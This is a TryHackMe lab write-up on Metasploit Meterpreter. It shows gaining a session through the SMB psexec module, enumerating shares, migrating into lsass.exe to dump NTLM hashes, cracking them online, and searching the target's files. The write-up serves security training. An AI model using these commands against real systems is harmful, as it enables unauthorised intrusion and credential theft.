# TryHackMe Writeup: Metasploit Meterpreter

## Task 5

> to simulate an initial compromise over SMB (Server Message Block) (using exploit/windows/smb/psexec)

### Step 1: Search for the Exploit Module
To find the appropriate exploit module for SMB, use the following command in Metasploit:
```bash
search smb psexec
use exploit/windows/smb/psexec
```

### Step 2: Set Required Options
Set the necessary options for the exploit module:
```bash
set RHOSTS <TARGET_HOST>
set SMBUser <USERNAME>
set SMBPass <PASSWORD>
```

### Step 3: Execute the Exploit
Run the exploit to gain a Meterpreter session:

```bash
exploit
```

Once the exploit is successful, you should have be presented to a meterpreter prompt.

#### Questions

1 - Computer Name
To find the computer name, use the following Meterpreter command:
```bash
sysinfo
```

2 - Target Domain
To find the target domain, use the same Meterpreter command:
```bash
sysinfo
```

3 - Name of the share likely created for the "penny" user
To find the shares on the target system, use the following Meterpreter command:
```bash
search smb type:auxiliary
use scanner/smb/smb_enumshares
set RHOSTS <TARGET_HOST>
set SMBUser <USERNAME>
set SMBPass <PASSWORD>
run
```

4 - What is the NTLM hash of the jchambers user?

```bash
#Migrate to lsass.exe to dump hashes
migrate <PID_of_lsass.exe>

hashdump
```
5 - What is the cleartext password of the jchambers user?
We can use site like crackstation.net to crack the NTLM hash obtained in the previous step.

6,7,8 and 9 - Additional Information

To find a file we can use search command in meterpreter:
```bash
search -f <FILENAME>
```

To read the file we can use:
```bash
cat <FILE_PATH>
```
